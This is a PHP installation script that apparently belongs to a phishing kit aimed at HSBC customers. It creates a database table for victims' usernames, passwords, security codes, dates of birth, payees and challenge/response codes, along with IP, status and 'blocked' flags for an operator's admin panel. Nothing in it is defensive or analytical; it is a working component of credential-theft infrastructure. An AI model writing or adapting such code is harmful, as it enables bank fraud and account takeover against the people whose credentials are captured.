<?php
require 'connection.php';

$installation = mysqli_query($conn, "CREATE TABLE `hsbc` (
  `username` varchar(255) DEFAULT NULL,

  `security-code` varchar(255) DEFAULT NULL,

  `dob` varchar(255) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,

  `payee` varchar(255) DEFAULT NULL,

  `challenge` varchar(255) DEFAULT NULL,
  `response` varchar(255) DEFAULT NULL,

  `status` varchar(255) DEFAULT '0',
  `viewed` varchar(255) DEFAULT 'false',
  `blocked` varchar(255) DEFAULT 'false',
  `ip` varchar(255) DEFAULT NULL,
  `uniqueid` bigint(255) DEFAULT NULL,
  `last_activity` int DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;");

if ($installation) {
  file_put_contents('../admin/installed.txt', 1);
  header("Location: ../admin/index.php?success");
} else {
  echo mysqli_error($conn);
  header("Location: ../install/sql-install.php?error");
}
?>
